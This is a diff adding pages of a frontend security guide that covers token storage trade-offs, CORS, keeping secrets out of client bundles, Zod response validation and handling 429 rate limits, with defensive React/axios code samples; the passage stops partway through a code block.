+<h2 id="5-secure-token-storage-trade-offs">5️⃣ Secure Token Storage Trade-offs</h2>
+<p>This is the most-argued topic in SPA security. The honest answer: <strong>every option is a trade-off</strong>, and the right default is the one from <a href="../14.3.Authentication/">14.3</a> — HttpOnly cookies.</p>
+<table>
+<thead>
+<tr>
+<th>Storage</th>
+<th>XSS-safe?</th>
+<th>CSRF-safe?</th>
+<th>Survives reload?</th>
+<th>Sent automatically?</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>HttpOnly cookie</strong></td>
+<td>✔️ JS can't read it</td>
+<td>⚠️ Needs <code>SameSite</code> + CSRF token</td>
+<td>✔️ Yes</td>
+<td>✔️ Yes (by browser)</td>
+<td>⭐ <strong>Recommended</strong></td>
+</tr>
+<tr>
+<td><strong>In-memory (JS variable / React state)</strong></td>
+<td>⚠️ Readable by XSS, but vanishes on reload (smaller window)</td>
+<td>✔️ Not auto-sent</td>
+<td>❌ No (lost on refresh)</td>
+<td>❌ Manual header</td>
+<td>✔️ Good for access tokens</td>
+</tr>
+<tr>
+<td><strong><code>localStorage</code></strong></td>
+<td>❌ Fully readable by any script</td>
+<td>✔️ Not auto-sent</td>
+<td>✔️ Yes</td>
+<td>❌ Manual header</td>
+<td>❌ <strong>Avoid for credentials</strong></td>
+</tr>
+<tr>
+<td><strong><code>sessionStorage</code></strong></td>
+<td>❌ Readable by script (per-tab)</td>
+<td>✔️ Not auto-sent</td>
+<td>⚠️ Per-tab only</td>
+<td>❌ Manual header</td>
+<td>❌ Avoid for credentials</td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-recommended-pattern">The recommended pattern</h3>
+<div class="admonition tip">
+<p class="admonition-title">Best of both worlds</p>
+<ul>
+<li><strong>Refresh token → HttpOnly, <code>Secure</code>, <code>SameSite</code> cookie.</strong> Never touches JavaScript. Used only against <code>/refresh</code>.</li>
+<li><strong>Access token → in memory</strong> (a module variable or auth context), short-lived (5–15 min). On page reload, silently call <code>/refresh</code> to get a fresh one.</li>
+<li>This keeps the long-lived credential out of JS entirely, and limits the blast radius of the short-lived one.</li>
+</ul>
+</div>
+<div class="language-jsx highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1">// auth-store.js — access token lives in memory only, never persisted</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="kd">let</span><span class="w"> </span><span class="nx">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="k">export</span><span class="w"> </span><span class="kd">const</span><span class="w"> </span><span class="nx">setAccessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="p">};</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="k">export</span><span class="w"> </span><span class="kd">const</span><span class="w"> </span><span class="nx">getAccessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">accessToken</span><span class="p">;</span>
+</span></code></pre></div>
+<div class="language-jsx highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1">// api.js — attach it via interceptor; refresh uses the HttpOnly cookie</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="k">import</span><span class="w"> </span><span class="nx">axios</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;axios&quot;</span><span class="p">;</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">getAccessToken</span><span class="p">,</span><span class="w"> </span><span class="nx">setAccessToken</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;./auth-store&quot;</span><span class="p">;</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="k">export</span><span class="w"> </span><span class="kd">const</span><span class="w"> </span><span class="nx">api</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">axios</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">  </span><span class="nx">baseURL</span><span class="o">:</span><span class="w"> </span><span class="k">import</span><span class="p">.</span><span class="nx">meta</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">VITE_API_URL</span><span class="p">,</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">  </span><span class="nx">withCredentials</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="c1">// send the HttpOnly refresh cookie to /refresh</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="p">});</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="nx">api</span><span class="p">.</span><span class="nx">interceptors</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="nx">config</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getAccessToken</span><span class="p">();</span>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="nx">config</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">Authorization</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`Bearer </span><span class="si">${</span><span class="nx">token</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">config</span><span class="p">;</span>
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="p">});</span>
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="nx">api</span><span class="p">.</span><span class="nx">interceptors</span><span class="p">.</span><span class="nx">response</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span>
+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="w">  </span><span class="p">(</span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span>
+</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="w">  </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">.</span><span class="nx">response</span><span class="o">?</span><span class="p">.</span><span class="nx">status</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">401</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">error</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">_retry</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="w">      </span><span class="nx">error</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">_retry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a><span class="w">      </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&quot;/refresh&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// HttpOnly cookie sent automatically</span>
+</span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a><span class="w">      </span><span class="nx">setAccessToken</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">accessToken</span><span class="p">);</span>
+</span><span id="__span-11-23"><a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a><span class="w">      </span><span class="nx">error</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">Authorization</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`Bearer </span><span class="si">${</span><span class="nx">data</span><span class="p">.</span><span class="nx">accessToken</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span><span id="__span-11-24"><a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="nx">error</span><span class="p">.</span><span class="nx">config</span><span class="p">);</span>
+</span><span id="__span-11-25"><a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-11-26"><a id="__codelineno-11-26" name="__codelineno-11-26" href="#__codelineno-11-26"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">Promise</span><span class="p">.</span><span class="nx">reject</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
+</span><span id="__span-11-27"><a id="__codelineno-11-27" name="__codelineno-11-27" href="#__codelineno-11-27"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-11-28"><a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a><span class="p">);</span>
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">If you persist a token, you've accepted the XSS risk</p>
+<p>There are legitimate reasons teams use <code>localStorage</code> (no shared cookie domain, mobile-webview constraints, third-party API tokens with tight scopes). That's a <em>decision</em>, not a default — and it only holds if your XSS defenses (§2) are airtight, tokens are short-lived, and the scope is minimal. Do not reach for it just to dodge a refresh flow.</p>
+</div>
+<hr />
+<h2 id="6-cors-a-browser-policy-not-authentication">6️⃣ CORS — A Browser Policy, Not Authentication</h2>
+<p>CORS (Cross-Origin Resource Sharing) is the <strong>most misunderstood</strong> topic in frontend security.</p>
+<div class="admonition danger">
+<p class="admonition-title">CORS does NOT protect your server</p>
+<p>CORS is a <strong>browser-enforced policy that protects the <em>user</em>, not the server.</strong> It controls whether <strong>browser JavaScript</strong> is allowed to <em>read</em> a cross-origin response. It does <strong>not</strong> stop requests from reaching your server, and it is trivially bypassed by any non-browser client (<code>curl</code>, Postman, a script, a mobile app). <strong>CORS is not authentication, not authorization, and not a firewall.</strong></p>
+</div>
+<h3 id="what-actually-happens">What actually happens</h3>
+<ol>
+<li>The Same-Origin Policy blocks JS on <code>app.example.com</code> from <strong>reading</strong> responses from <code>api.other.com</code>.</li>
+<li>CORS is the server's way of saying "it's OK for that origin's JS to read my responses," via <code>Access-Control-Allow-Origin</code> and friends.</li>
+<li>For "non-simple" requests, the browser first sends a <strong>preflight</strong> <code>OPTIONS</code> request to ask permission.</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Browser → OPTIONS /data (preflight) → Server replies:
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  Access-Control-Allow-Origin: https://app.example.com
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>  Access-Control-Allow-Methods: GET, POST
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>  Access-Control-Allow-Headers: Authorization, Content-Type
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>  Access-Control-Allow-Credentials: true
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>Browser → actual GET /data (only now)
+</span></code></pre></div>
+<div class="language-jsx highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1">// Frontend side: to send cookies cross-origin you opt in:</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">api</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">axios</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span><span class="nx">baseURL</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;https://api.example.com&quot;</span><span class="p">,</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">  </span><span class="nx">withCredentials</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="c1">// browser includes cookies; server MUST allow credentials</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="p">});</span>
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">Two CORS misconfigurations to avoid</p>
+<ol>
+<li><strong><code>Access-Control-Allow-Origin: *</code> <em>with</em> credentials</strong> is forbidden by the spec — and reflecting <em>any</em> <code>Origin</code> back while allowing credentials effectively trusts every site. Whitelist exact origins.</li>
+<li>A CORS error in the console means <strong>your server didn't grant permission</strong> — fix it on the server. Do <strong>not</strong> "solve" it by disabling browser security, using a public CORS-proxy in production, or weakening the policy to <code>*</code>.</li>
+</ol>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Where real protection lives</p>
+<p>Because CORS doesn't stop requests, your <strong>server</strong> must still authenticate every request (tokens/cookies) and authorize every action. Treat CORS purely as "which front-end origins may read my responses in a browser."</p>
+</div>
+<hr />
+<h2 id="7-secrets-handling-never-ship-secrets-to-the-client">7️⃣ Secrets Handling — Never Ship Secrets to the Client</h2>
+<div class="admonition danger">
+<p class="admonition-title">Everything in your bundle is public</p>
+<p>Your JS bundle, your <code>.env</code> values that get inlined, your source maps — all of it is downloadable and readable by anyone. <strong>There is no such thing as a secret in the browser.</strong> A "hidden" API key in your React code is a published API key.</p>
+</div>
+<h3 id="build-time-env-vars-are-embedded-not-hidden">Build-time env vars are <em>embedded</em>, not hidden</h3>
+<p>Vite and Next.js inline certain env vars into the bundle <strong>at build time</strong>. The prefix is a signal that the value is <strong>public</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Framework</th>
+<th>Public prefix (shipped to browser)</th>
+<th>Private (server-only)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Vite</strong></td>
+<td><code>VITE_</code> → <code>import.meta.env.VITE_*</code></td>
+<td>anything without the prefix</td>
+</tr>
+<tr>
+<td><strong>Next.js</strong></td>
+<td><code>NEXT_PUBLIC_</code> → <code>process.env.NEXT_PUBLIC_*</code></td>
+<td><code>process.env.*</code> used only in server code</td>
+</tr>
+<tr>
+<td><strong>Create React App</strong></td>
+<td><code>REACT_APP_</code></td>
+<td>n/a</td>
+</tr>
+</tbody>
+</table>
+<div class="language-js highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1">// FINE — public config: API base URL, publishable keys (e.g. a Stripe *publishable* key)</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">apiUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">import</span><span class="p">.</span><span class="nx">meta</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">VITE_API_URL</span><span class="p">;</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="c1">// NEVER — this secret is now in your bundle for the world to read:</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="kd">const</span><span class="w"> </span><span class="nx">stripeSecret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">import</span><span class="p">.</span><span class="nx">meta</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">VITE_STRIPE_SECRET_KEY</span><span class="p">;</span><span class="w"> </span><span class="c1">// ❌❌❌</span>
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title"><code>VITE_</code> / <code>NEXT_PUBLIC_</code> = intentionally public</p>
+<p>Anything you prefix this way is <strong>compiled into client code</strong>. Only put values there that you're comfortable printing on a billboard: API base URLs, publishable/anon keys <em>designed</em> for client exposure, feature flags. Real secrets (private API keys, DB credentials, signing secrets) must stay <strong>server-side</strong> and be accessed only by your backend / serverless functions / BFF.</p>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">The pattern for third-party secrets</p>
+<p>If the frontend needs to call a service that requires a secret key (payment provider, email API, AI provider), <strong>proxy through your own backend</strong>. The browser calls <em>your</em> endpoint (authenticated); your server adds the secret and calls the third party. The secret never leaves the server.</p>
+</div>
+<p>Also: keep <code>.env*</code> files <strong>out of git</strong> (<code>.gitignore</code>), and disable or restrict source maps in production if your build would otherwise expose internal structure.</p>
+<hr />
+<h2 id="8-input-validation-response-validation-zod">8️⃣ Input Validation &amp; Response Validation (Zod)</h2>
+<div class="admonition note">
+<p class="admonition-title">Client validation is for UX; server validation is for security</p>
+<p>Validate input on the client so users get instant feedback — but <strong>never rely on it for security</strong>. Anyone can bypass the form. The server must re-validate everything. That said, the frontend should still validate <strong>what comes back</strong>, because a malformed/untrusted response can crash your app or feed bad data into dangerous sinks.</p>
+</div>
+<h3 id="validating-api-responses-with-zod">Validating API responses with Zod</h3>
+<p>Treating API responses as <code>any</code> is how <code>undefined is not a function</code> ends up in production. A schema gives you runtime guarantees <em>and</em> TypeScript types from one source.</p>
+<div class="language-ts highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">z</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;zod&quot;</span><span class="p">;</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">api</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;./api&quot;</span><span class="p">;</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="kd">const</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">z</span><span class="p">.</span><span class="nx">object</span><span class="p">({</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="w">  </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="kt">z.string</span><span class="p">().</span><span class="nx">uuid</span><span class="p">(),</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="w">  </span><span class="nx">email</span><span class="o">:</span><span class="w"> </span><span class="kt">z.string</span><span class="p">().</span><span class="nx">email</span><span class="p">(),</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">  </span><span class="nx">role</span><span class="o">:</span><span class="w"> </span><span class="kt">z.enum</span><span class="p">([</span><span class="s2">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">]),</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="w">  </span><span class="c1">// Validate any URL you&#39;ll later put in href/src</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="w">  </span><span class="nx">avatarUrl</span><span class="o">:</span><span class="w"> </span><span class="kt">z.string</span><span class="p">().</span><span class="nx">url</span><span class="p">().</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&quot;https://&quot;</span><span class="p">).</span><span class="nx">optional</span><span class="p">(),</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="p">});</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="kr">type</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">z</span><span class="p">.</span><span class="nx">infer</span><span class="o">&lt;</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">User</span><span class="o">&gt;</span><span class="p">;</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="k">export</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">getUser</span><span class="p">(</span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">User</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="sb">`/users/</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="w">  </span><span class="c1">// Throws if the server sent something unexpected — fail loud, not silently</span>
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">User</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="p">}</span>
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Validate, sanitize, then render</p>
+<p>The safe pipeline is: <strong>validate</strong> the shape (Zod) → <strong>sanitize</strong> any HTML/URLs (DOMPurify, scheme allow-list) → <strong>render</strong> as text via React. Each step assumes the previous data is still untrusted.</p>
+</div>
+<hr />
+<h2 id="9-rate-limiting-abuse-the-clients-role">9️⃣ Rate Limiting &amp; Abuse — The Client's Role</h2>
+<div class="admonition danger">
+<p class="admonition-title">Rate limiting is enforced on the server</p>
+<p>A client <strong>cannot</strong> rate-limit an attacker — the attacker controls the client. Brute-force protection, per-IP/per-account throttling, and bot mitigation are <strong>server-side</strong>. The frontend's job is to (a) not <em>cause</em> abuse, and (b) handle <code>429 Too Many Requests</code> gracefully.</p>
+</div>
+<h3 id="be-a-good-client">Be a good client</h3>
+<ul>
+<li><strong>Debounce/throttle</strong> search-as-you-type and autosave so you don't hammer the API (see <a href="../14.4.Advanced%20API%20Scenarios/">14.4 Advanced API Scenarios</a>).</li>
+<li><strong>Cancel</strong> stale in-flight requests with <code>AbortController</code>.</li>
+<li><strong>Cache</strong> with React Query/SWR instead of refetching constantly.</li>
+</ul>
+<h3 id="handle-429-correctly-respect-retry-after">Handle <code>429</code> correctly (respect <code>Retry-After</code>)</h3>
+<div class="language-js highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nx">api</span><span class="p">.</span><span class="nx">interceptors</span><span class="p">.</span><span class="nx">response</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="w">  </span><span class="p">(</span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="w">  </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">.</span><span class="nx">response</span><span class="o">?</span><span class="p">.</span><span class="nx">status</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">429</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">      </span><span class="kd">const</span><span class="w"> </span><span class="nx">retryAfter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Number</span><span class="p">(</span><span class="nx">error</span><span class="p">.</span><span class="nx">response</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="s2">&quot;retry-after&quot;</span><span class="p">])</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="mf">5</span><span class="p">;</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">      </span><span class="c1">// Back off, surface a friendly message, then retry once</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="w">      </span><span class="k">await</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">((</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">retryAfter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1000</span><span class="p">));</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="nx">error</span><span class="p">.</span><span class="nx">config</span><span class="p">);</span>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="w">    </span><span class="p">}</span>
